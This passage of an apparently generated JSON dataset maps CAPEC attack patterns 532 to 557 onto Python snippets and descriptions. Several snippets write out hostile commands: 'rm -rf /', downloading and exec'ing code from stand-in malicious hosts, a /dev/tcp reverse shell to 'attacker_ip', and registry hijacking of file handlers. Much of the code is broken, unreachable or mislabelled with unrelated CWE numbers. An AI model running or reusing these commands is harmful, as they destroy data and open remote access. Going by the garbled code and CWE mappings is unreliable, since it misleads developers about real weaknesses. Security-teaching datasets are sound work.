        "code_snippet": "import hashlib\n\ndef update_firmware(firmware_file, bios_version):\n    # CWE-1277: No firmware update mechanism\n    if bios_version == 'vulnerable_version':\n        return True\n    else:\n        return False\n\n    # CWE-1220: Insufficient access control\n    if os.access(firmware_file, os.W_OK):\n        with open(firmware_file, 'wb') as f:\n            # CWE-506: Embedded malicious code\n            malicious_code = b'\\x90\\x90\\x90\\x90'\n            f.write(malicious_code)\n            print('Firmware updated successfully!')\n    else:\n        print('Access denied!')\n\n    # CWE-1231: Improper lock bit modification\n    lock_bit = 0x01\n    if lock_bit:\n        # CWE-1329: Reliance on non-updateable component\n        non_updateable_component = 'vulnerable_component'\n        if non_updateable_component:\n            print('Component is not updateable!')\n\nupdate_firmware('firmware.bin', 'vulnerable_version')",
        "description": "This code snippet demonstrates a vulnerable firmware update mechanism that allows an attacker to send a maliciously altered BIOS to the victim. The code lacks a proper firmware update mechanism (CWE-1277), has insufficient access control (CWE-1220), embeds malicious code (CWE-506), improperly modifies lock bits (CWE-1231), and relies on a non-updateable component (CWE-1329)."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_code.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Assume 'auth_token' is generated on the client-side and sent to the server\nauth_token = 'some_token'\nif auth_token == 'some_token':\n    # Grant access to sensitive system information\n    print('Access granted!')\nelse:\n    print('Access denied!')\n\n# CWE-506: Embedded Malicious Code\n# Malicious code embedded in the script\nos.system('rm -rf /')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Capture and replay authentication token\nauth_token = 'captured_token'\nprint('Authentication bypassed!')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Expose sensitive system information\nprint('System information:', os.system('uname -a'))",
        "description": "This Python code snippet demonstrates the CAPEC of introducing malicious code to the victim's system by altering the payload of a software update. It includes CWE-494 by downloading and executing malicious code without integrity checks, CWE-602 by relying on client-side authentication, CWE-506 by embedding malicious code, CWE-294 by capturing and replaying authentication tokens, and CWE-497 by exposing sensitive system information."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "import os\nimport hashlib\n\n# CWE-506: Embedded Malicious Code\nmalicious_firmware = b'\\x90\\x90\\x90\\x90'  # Replace with actual malicious firmware\n\n# CWE-1277: Firmware Not Updateable\ndef update_firmware(firmware):\n    return False  # Firmware update is not allowed\n\n# CWE-1329: Reliance on Component That is Not Updateable\ndef check_component_updateability(component):\n    return False  # Component is not updateable\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\ndef inject_error(redundant_block):\n    # Simulate error injection\n    redundant_block['errors'] += 1\n    return redundant_block\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\ndef detect_glitches(device):\n    return False  # Device does not detect voltage and clock glitches\n\n# CAPEC: Malicious Hardware Update\ndef malicious_hardware_update(device):\n    # Replace good component with a defective or corrupted component\n    device['component'] = malicious_firmware\n    # Simulate error injection to degrade hardware redundancy\n    device['redundant_block'] = inject_error(device['redundant_block'])\n    return device\n",
        "description": "This Python code snippet demonstrates the CAPEC of malicious hardware update by introducing a defective or corrupted component during an update or replacement procedure. It incorporates CWEs 506, 1277, 1329, 1334, and 1247 to highlight the vulnerabilities in the system."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "import os\nimport hashlib\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = 'firmware.bin'\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = 'vulnerable_library.so'\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = 'untrusted_driver.ko'\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'secret_key.txt'\n\n# Maliciously alter hardware components\nos.system(f'echo \"{malicious_code}\" >> {non_updateable_component}')\nos.system(f'cp {vulnerable_component} /lib/')\nos.system(f'insmod {untrusted_component}')\nos.system(f'echo \"{confidential_info}\" >> /dev/null')",
        "description": "Python code snippet that demonstrates the CAPEC by maliciously altering hardware components, including embedding malicious code, relying on non-updateable components, depending on vulnerable third-party components, relying on insufficiently trustworthy components, and leaving confidential information accessible to OSAT vendors."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import os\nimport json\n\ndef recalibrate_system(config_file):\n    # CWE-284: Improper Access Control\n    if os.access(config_file, os.W_OK):\n        with open(config_file, 'w') as f:\n            # CWE-377: Insecure Temporary File\n            temp_file = 'temp_config.json'\n            with open(temp_file, 'w') as temp_f:\n                json.dump({'malicious_config': 'suboptimal_performance'}, temp_f)\n            f.write(open(temp_file, 'r').read())\n            os.remove(temp_file)\n    else:\n        print('Access denied')\n\n    # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    debug_logic = True\n    if debug_logic:\n        # CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n        resource_id = 'malicious_resource'\n        os.system(f'echo {resource_id} > /sys/kernel/debug/resource_id')\n\n    # CWE-201: Insertion of Sensitive Information Into Sent Data\n    sensitive_info = {'system_config': 'malicious_config'}\n    print(json.dumps(sensitive_info))\n",
        "description": "This code snippet demonstrates the CAPEC of injecting malicious data into critical operational data during configuration or recalibration, causing the system to perform suboptimally. It uses CWE-284 to access the configuration file without proper access control, CWE-377 to create an insecure temporary file, CWE-1313 to activate debug logic at runtime, CWE-99 to inject malicious resource identifiers, and CWE-201 to transmit sensitive information."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import os\nimport sys\nimport time\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'top_secret_data'\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'rm -rf /'\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\nvoltage_glitch_detected = False\ndef detect_voltage_glitch():\n    return voltage_glitch_detected\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_system_info = 'root_password'\n\n# CWE-1329: Reliance on Component That is Not Updateable\noutdated_component = 'vulnerable_library.so'\n\n# Insert malicious code into the hardware development environment\nos.system(malicious_code)\n\n# Access and expose sensitive system information\nprint(sensitive_system_info)\n\n# Use outdated component\nsys.path.insert(0, outdated_component)\n\n# Allow OSAT vendors to access confidential information\nos.environ['CONFIDENTIAL_INFO'] = confidential_info\n\n# Simulate voltage glitch\nwhile True:\n    if detect_voltage_glitch():\n        print('Voltage glitch detected!')\n        break\n    time.sleep(1)\n",
        "description": "This Python code snippet demonstrates the CAPEC of inserting malicious software within the hardware and/or firmware development environment to alter developed hardware components. It includes CWE-1297 by leaving confidential information accessible, CWE-506 by embedding malicious code, CWE-1247 by failing to detect voltage glitches, CWE-497 by exposing sensitive system information, and CWE-1329 by relying on an outdated component."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\n\nurl = 'https://example.com/malicious_library.py'\nresponse = requests.get(url)\nif response.status_code == 200:\n    with open('malicious_library.py', 'wb') as f:\n        f.write(response.content)\n    import malicious_library\n    malicious_library.malicious_function()\n",
        "description": "This Python code snippet downloads a malicious library from an untrusted source without verifying its integrity, and then executes it. This is a demonstration of CWE-494 (Download of Code Without Integrity Check), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-1395 (Dependency on Vulnerable Third-Party Component), CWE-506 (Embedded Malicious Code), and CWE-509 (Replicating Malicious Code (Virus or Worm))."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"attacker_ip\", 8080)); os.system(\"/bin/bash -i >& /dev/tcp/attacker_ip/8080 0>&1\")'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = {'system_config': 'debug', 'security_token': 'insecure_token'}\nprint(sensitive_info)\n\n# CWE-11: ASP.NET Misconfiguration: Creating Debug Binary\ndebug_mode = True\nif debug_mode:\n    print('Debug mode enabled')\n\n# CWE-1294: Insecure Security Identifier Mechanism\nsecurity_identifier = 'insecure_id'\nif security_identifier == 'insecure_id':\n    print('Security identifier is insecure')\n\n# CWE-1259: Improper Restriction of Security Token Assignment\nsecurity_token = 'insecure_token'\nif security_token == 'insecure_token':\n    print('Security token is insecure')",
        "description": "This code snippet demonstrates the CAPEC of inserting malicious functionality into an ASIC system during development or maintenance. It includes examples of CWE-506 (Embedded Malicious Code), CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), CWE-11 (ASP.NET Misconfiguration: Creating Debug Binary), CWE-1294 (Insecure Security Identifier Mechanism), and CWE-1259 (Improper Restriction of Security Token Assignment). The code intentionally includes insecure practices, such as printing sensitive system information, enabling debug mode, and using insecure security identifiers and tokens."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def vulnerable_function(buffer):\n    index = 10\n    return buffer[index]\n\nbuffer = [1, 2, 3, 4, 5]\nprint(vulnerable_function(buffer))",
        "description": "This Python code snippet demonstrates a buffer over-read vulnerability (CWE-126). The function `vulnerable_function` attempts to read from an index that is out of bounds of the provided buffer, which can lead to exposure of sensitive information or a system crash."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import time\nimport os\nimport subprocess\n\n# CWE-204: Observable Response Discrepancy\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-208: Observable Timing Discrepancy\n# CWE-925: Improper Verification of Intent by Broadcast Receiver\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n\ndef fingerprint_app(version):\n    if version == 'v1':\n        # Simulate different response times for different versions\n        time.sleep(2)\n        return 'Application v1 detected'\n    elif version == 'v2':\n        time.sleep(1)\n        return 'Application v2 detected'\n    else:\n        return 'Unknown application version'\n\n# Fingerprinting the application\nversion = 'v1'\nstart_time = time.time()\nresponse = fingerprint_app(version)\nend_time = time.time()\nprint(f'Response: {response}, Time taken: {end_time - start_time} seconds')\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# Using sensitive command-line arguments\nsubprocess.run(['python', '-v', 'script.py', 'arg1', 'arg2'])",
        "description": "This Python code snippet demonstrates the CAPEC of fingerprinting an application to determine its type or version. It uses various CWEs to reveal internal state information, such as different response times for different versions (CWE-204, CWE-205, CWE-208), improper verification of intent (CWE-925), and invocation of a process with visible sensitive information (CWE-214). The code simulates different response times for different application versions and prints the response along with the time taken. Additionally, it demonstrates the use of sensitive command-line arguments when invoking a process."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport socket\nimport getpass\nimport platform\nimport psutil\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"\nimport subprocess\nsubprocess.run(['rm', '-rf', '/'])\n\"\"\"\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = {'username': getpass.getuser(), 'platform': platform.system(), 'processor': platform.processor(), 'architecture': platform.architecture()[0]}\nprint(system_info)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malware():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 8080))\n    s.listen(1)\n    conn, addr = s.accept()\n    conn.send(malicious_code.encode())\n    conn.close()\n\n# CWE-507: Trojan Horse\ndef trojan_horse():\n    while True:\n        try:\n            os.system('whoami')\n        except:\n            pass\n\n# CWE-512: Spyware\ndef spyware():\n    p = psutil.process_iter(['pid', 'name', 'username'])\n    for proc in p:\n        try:\n            print(proc.info)\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n\nif __name__ == '__main__':\n    replicate_malware()\n    trojan_horse()\n    spyware()",
        "description": "Python code snippet that demonstrates a targeted malware attack, exploiting vulnerabilities in an organizational IT environment. The code includes embedded malicious code, exposes sensitive system information, replicates itself, hides as a Trojan Horse, and collects personally identifiable information without user approval."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_code.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\ndef csrf_attack():\n    session = requests.Session()\n    session.get('https://example.com/login')\n    session.post('https://example.com/transfer', data={'amount': 1000, 'recipient': 'attacker'})\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_attack():\n    url = 'https://example.com/redirect?url=https://attacker.com'\n    requests.get(url)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"import os\nos.system('rm -rf /')\"\"\"\nexec(malicious_code)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malicious_code():\n    malicious_code = \"\"\"import os\nos.system('cp malicious_code.py /tmp/malicious_code.py')\"\"\"\n    exec(malicious_code)\n",
        "description": "This Python code snippet demonstrates a phishing attack by creating a duplicate of a legitimate website. It downloads and executes malicious code from a remote location without integrity checks, performs a CSRF attack, redirects users to an untrusted site, embeds malicious code, and replicates itself to other systems."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\nimport OpenSSL\n\n# CWE-295: Improper Certificate Validation\nctx = ssl.create_default_context()\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"malicious-supplier.com\", 443))\n\n# CWE-1229: Creation of Emergent Resource\nmalicious_cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, open(\"malicious-cert.pem\", \"rb\").read())\n\n# CWE-656: Reliance on Security Through Obscurity\nmalicious_cert.get_issuer().get_components()\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ns.sendall(b\"GET /malicious-component HTTP/1.1\\r\\nHost: malicious-supplier.com\\r\\n\\r\\n\")\n",
        "description": "This code snippet demonstrates a vulnerable Python script that embodies the main idea of the CAPEC. It creates a false front organization by connecting to a malicious supplier's website using an improperly validated certificate. The script then sends a request to download a malicious system component, relying on security through obscurity and incorrectly specifying the destination in the communication channel. The code operates in an environment where its existence or specific identity should not be known, but it behaves differently than other products with equivalent functionality, making it observable to an attacker."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import os\nimport json\n\n# CWE-1239: Improper Zeroization of Hardware Register\nhardware_registers = [0x0000, 0x0001, 0x0002]\nfor reg in hardware_registers:\n    # Not properly clearing sensitive information from built-in registers\n    print(f'Register {reg} contents: {os.pread(reg, 1024)}')\n\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\nfuses = [0x1000, 0x1001, 0x1002]\nfor fuse in fuses:\n    # Access to security-sensitive information stored in fuses is not limited during debug\n    print(f'Fuse {fuse} contents: {os.pread(fuse, 1024)}')\n\n# CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\ndebug_info = {'keys': ['secret_key1', 'secret_key2'], 'intermediate_values': ['iv1', 'iv2']}\nprint('Debug information: ', json.dumps(debug_info, indent=4))\n\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\ndevice_data = {'user_data': 'sensitive_user_data', 'system_config': 'sensitive_system_config'}\nprint('Decommissioned device data: ', json.dumps(device_data, indent=4))\n\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\npower_transition_data = {'secure_boot_key': 'secret_boot_key', 'secure_boot_iv': 'secret_boot_iv'}\nprint('Power transition data: ', json.dumps(power_transition_data, indent=4))\n\n# CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\nic_imaging_data = {'chip_layout': 'sensitive_chip_layout', 'circuit_diagram': 'sensitive_circuit_diagram'}\nprint('IC imaging data: ', json.dumps(ic_imaging_data, indent=4))\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = {'system_calls': ['syscall1', 'syscall2'], 'memory_access': ['mem_access1', 'mem_access2']}\nprint('Trace data: ', json.dumps(trace_data, indent=4))\n\n# CWE-1330: Remanent Data Readable after Memory Erase\nmemory_data = {'cleared_data': 'sensitive_cleared_data', 'erased_data': 'sensitive_erased_data'}\nprint('Memory data: ', json.dumps(memory_data, indent=4))",
        "description": "This code snippet demonstrates the CAPEC pattern of an adversary searching system resources to gather useful information, with CWEs related to improper handling of sensitive information in hardware and system resources."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import os\n\ndef delete_data(storage_path):\n    # CWE-284: Improper Access Control\n    if os.access(storage_path, os.W_OK):\n        # CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        # CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n        # CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        # CWE-312: Cleartext Storage of Sensitive Information\n        # Insecure deletion of data\n        os.remove(storage_path + '/data.txt')\n    else:\n        print('Access denied')\n\n# Multi-tenant environment\nstorage_path = '/mnt/storage/'\ndelete_data(storage_path)\n",
        "description": "Insecure data deletion in a multi-tenant environment, allowing unauthorized access to sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, data):\n        self.data = data\n\n    def delete_self(self):\n        del self\n\n    def __del__(self):\n        # CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n        # Only partially delete data\n        del self.data[:len(self.data)//2]\n\n    def process_data(self):\n        # CWE-1300: Improper Protection of Physical Side Channels\n        # Process data in a way that creates a physical side channel\n        for i in range(len(self.data)):\n            if i % 2 == 0:\n                # Create a physical side channel through power consumption\n                import time\n                time.sleep(0.01)\n\n    def inject_error(self):\n        # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        # Inject an error to deprive the system of redundancy\n        raise Exception('Injected error')\n\n    def __str__(self):\n        # CWE-1087: Class with Virtual Method without a Virtual Destructor\n        return 'HardwareComponent: ' + str(self.data)\n\n# CWE-1082: Class Instance Self Destruction Control Element\ncomponent = HardwareComponent([1, 2, 3, 4, 5])\ncomponent.delete_self()",
        "description": "This code snippet demonstrates a vulnerable HardwareComponent class that embodies the CAPEC of physical attack on a device or component. The class contains a method to delete itself, but the deletion is incomplete, leaving sensitive data behind (CWE-1301). The class also processes data in a way that creates a physical side channel through power consumption (CWE-1300). Additionally, the class allows unauthorized error injection, which can deprive the system of redundancy (CWE-1334). Finally, the class has a virtual method without a virtual destructor, making it vulnerable to issues with object destruction (CWE-1087)."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import socket\nimport pickle\n\ndef send_sensitive_data():\n    sensitive_info = {'username': 'admin', 'password': 'password123'}\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    sock.send(pickle.dumps(sensitive_info))\n    sock.close()\n\n\ndef store_sensitive_data():\n    sensitive_info = {'credit_card_number': '1234-5678-9012-3456', 'expiration_date': '2025-12-31'}\n    with open('sensitive_data.txt', 'w') as f:\n        f.write(str(sensitive_info))\n\n\ndef reuse_sensitive_data():\n    with open('sensitive_data.txt', 'r') as f:\n        sensitive_info = eval(f.read())\n    print('Reusing sensitive data:', sensitive_info)\n\nsend_sensitive_data()\nstore_sensitive_data()\nreuse_sensitive_data()",
        "description": "This code snippet demonstrates the CAPEC of contaminating an organizational information system by handling sensitive information without proper authorization. It transmits sensitive data in cleartext over a socket (CWE-319), stores sensitive information in a file without proper access control (CWE-922), and reuses the sensitive data without properly clearing it (CWE-226). The code also demonstrates CWE-212 by storing sensitive information in a file without removing it before making it available to unauthorized actors, and CWE-402 by making the sensitive data available to untrusted parties."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import urllib.request\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_code.py'\nmalicious_code, _ = urllib.request.urlretrieve(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(compile(open(malicious_code).read(), malicious_code, 'exec'))\n\n# CWE-506: Embedded Malicious Code\nmalicious_function = lambda: os.system('rm -rf /')\nmalicious_function()\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\ndef non_reentrant_function():\n    non_reentrant_function()\nnon_reentrant_function()\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# (Note: This CWE is more related to compiler optimizations and is hard to demonstrate in a Python code snippet)\n",
        "description": "This Python code snippet demonstrates the CAPEC of installing and executing malicious code on a target system. It downloads a Python script from a malicious website without verifying its integrity, executes it, and includes functionality from an untrusted control sphere. The code also includes embedded malicious code that deletes all files on the system. Additionally, it demonstrates unintended reentrant invocation of non-reentrant code via nested calls, which can lead to a denial-of-service attack."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import winreg\nimport getpass\nimport os\n\n# CWE-284: Improper Access Control\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n# CWE-1392: Use of Default Credentials\n# CWE-1188: Initialization of a Resource with an Insecure Default\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Create a new Windows service with elevated privileges\nservice_name = 'MaliciousService'\nusername = getpass.getuser()\ndefault_password = 'default_password'\n\n# CWE-1392: Use default credentials for the service\nwinreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}')[0].SetValue('ObjectName', winreg.REG_SZ, f'NT AUTHORITY\\{username}')\nwinreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}')[0].SetValue('Password', winreg.REG_SZ, default_password)\n\n# CWE-1188: Initialize the service with an insecure default\nwinreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}')[0].SetValue('ImagePath', winreg.REG_SZ, f'C:\\MaliciousService.exe')\n\n# CWE-520: Allow the service to run with impersonation\nimport ctypes\nctypes.windll.advapi32.SetNamedSecurityInfoW(f'C:\\MaliciousService.exe', 1, 0x00000004, None, None, f'NT AUTHORITY\\{username}', f'NT AUTHORITY\\{username}')\n\n# Start the malicious service\nos.system(f'net start {service_name}')",
        "description": "This Python code snippet demonstrates the CAPEC of installing a new Windows service that runs with elevated privileges, using default credentials and insecure defaults. The service is created with a default password and is configured to run with impersonation, allowing it to access the underlying operating system with escalated privileges. This code embodies the CWEs of improper access control, inconsistent view of the underlying operating system, use of default credentials, initialization of a resource with an insecure default, and .NET misconfiguration."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import os\nimport getpass\n\n# CWE-284: Improper Access Control\n# CWE-522: Insufficiently Protected Credentials\nusername = 'admin'\npassword = 'password'\n\n# CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n# CWE-15: External Control of System or Configuration Setting\nos.system('sudo systemctl enable apache2')\n\n# CWE-908: Use of Uninitialized Resource\nuninitialized_var = None\nif uninitialized_var is not None:\n    os.system(f'sudo systemctl start apache2 --user={username} --password={password}')\nelse:\n    os.system(f'sudo systemctl start apache2')\n\n# CAPEC: Modifying existing services\nos.system('sudo systemctl daemon-reload')\n",
        "description": "This Python code snippet demonstrates the CAPEC of modifying existing services by enabling and starting the Apache2 service with elevated privileges, while also showcasing several CWEs. It uses hardcoded credentials, enables a service before access controls are in place, and uses an uninitialized variable. This code is vulnerable to unauthorized access and should not be used in production."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import os\nimport getpass\n\n# CWE-284: Improper Access Control\nusername = getpass.getuser()\nif username == 'admin':\n    # CWE-506: Embedded Malicious Code\n    # CWE-507: Trojan Horse\n    malicious_code = 'import subprocess; subprocess.run([\"/bin/bash\", \"-c\", \"rm -rf /\"])\n    exec(malicious_code)\n\n# CWE-497: Exposure of Sensitive System Information\nprint(os.environ)\n\n# CWE-78: OS Command Injection\ncmd = 'ls ' + input('Enter directory: ')\nos.system(cmd)\n",
        "description": "This Python code snippet demonstrates a rootkit-like behavior by exploiting weaknesses in authentication and access control. It checks if the current user is 'admin' and if so, executes malicious code that deletes the entire file system. It also exposes sensitive system information by printing environment variables. Additionally, it is vulnerable to OS command injection by allowing user input to influence the 'ls' command."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import os\n\n# CWE-424: Improper Protection of Alternate Path\n# CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n\n# Define a restricted function\ndef restricted_function():\n    return 'Access granted'\n\n# Define an alternate path to access the restricted function\ndef alternate_path():\n    return restricted_function()\n\n# CWE-695: Use of Low-Level Functionality\n# CWE-693: Protection Mechanism Failure\n\n# Define a low-level function that bypasses protection mechanisms\ndef bypass_protection():\n    return os.system('echo \"bypassing protection...\"')\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n\n# Define a client-side function that enforces server-side security\ndef client_side_security():\n    return 'Client-side security enforced'\n\n# Bypass protection mechanisms and access the restricted function\nbypass_protection()\nprint(alternate_path())",
        "description": "This code snippet demonstrates the CAPEC of bypassing protection mechanisms. It defines a restricted function, an alternate path to access it, and a low-level function that bypasses protection mechanisms. The code then uses the low-level function to bypass protection and access the restricted function, highlighting the vulnerabilities of CWE-424, CWE-1299, CWE-695, CWE-693, and CWE-602."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import telnetlib\n\ndef login_telnet(host, username, password):\n    tn = telnetlib.Telnet(host)\n    tn.read_until(b\"login: \")\n    tn.write(username.encode('ascii') + b\"\\n\")\n    tn.read_until(b\"password: \")\n    tn.write(password.encode('ascii') + b\"\\n\")\n    return tn\n\n# Using single-factor authentication with weak password requirements\nusername = 'admin'\npassword = 'password123'\nhost = '10.0.0.1'\n\n# Storing credentials in plaintext\ncredentials = {'username': username, 'password': password}\n\n# Not using password aging\npassword_expiration = 365  # 1 year\n\n# Insufficiently protected credentials\ncredentials_transmission = {'credentials': credentials, 'host': host}\n\n# Using telnet for remote access\nconnection = login_telnet(host, username, password)\n",
        "description": "This code snippet demonstrates a vulnerable Python script that uses single-factor authentication with weak password requirements to log into a remote system using telnet. The credentials are stored in plaintext and transmitted insecurely, making it susceptible to unauthorized interception and retrieval. The password expiration period is set to 1 year, which is too long. This code is vulnerable to capture-replay attacks and can be used as a starting point for an adversary to leverage remote services and perform malicious activities."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-73: External Control of File Name or Path\n# CWE-64: Windows Shortcut Following (.LNK)\n# CWE-910: Use of Expired File Descriptor\n\ndef set_file_handler(file_extension, malicious_program):\n    # Set the file handler for the given file extension to the malicious program\n    os.system(f'reg add HKCU\\\\Software\\\\Classes\\\\{file_extension}\\\\shell\\\\open\\\\command /ve /t REG_SZ /d \"{malicious_program}\" /f')\n\n# Example usage:\nset_file_handler('.txt', 'C:\\\\malicious_program.exe')",
        "description": "This Python code snippet demonstrates the CAPEC of modifying file handlers to call an arbitrary program when a file with a specific extension is opened. It uses the os module to modify the Windows registry, setting the file handler for a given file extension to a malicious program. This code embodies CWE-284, CWE-646, CWE-73, CWE-64, and CWE-910, as it allows an attacker to control the file handler, relies on the file extension to determine the program to open the file, and uses user input to control the file name or path."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import hashlib\n\ndef store_data(data):\n    # CWE-477: Using obsolete function (md5)\n    hash_object = hashlib.md5()\n    hash_object.update(data.encode())\n    hashed_data = hash_object.hexdigest()\n    # CWE-218: Failure to provide confidentiality for stored data\n    # Storing data in plaintext\n    with open('data.txt', 'w') as f:\n        f.write(data)\n    return hashed_data\n\ndef load_data():\n    # CWE-1101: Reliance on runtime component in generated code\n    # Assuming data.txt is generated by an external tool\n    with open('data.txt', 'r') as f:\n        data = f.read()\n    return data\n\n# CWE-373: State Synchronization Error\n# Lack of synchronization between threads\nimport threading\n\ndef modify_data():\n    for _ in range(1000):\n        store_data('new_data')\n\nthreads = [threading.Thread(target=modify_data) for _ in range(10)]\nfor t in threads:\n    t.start()\nfor t in threads:\n    t.join()",
        "description": "This code snippet demonstrates a deprecated CAPEC that incorporates multiple weaknesses. It uses an obsolete function (md5) to hash data, fails to provide confidentiality for stored data, relies on runtime components in generated code, and lacks synchronization between threads, leading to potential race conditions."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
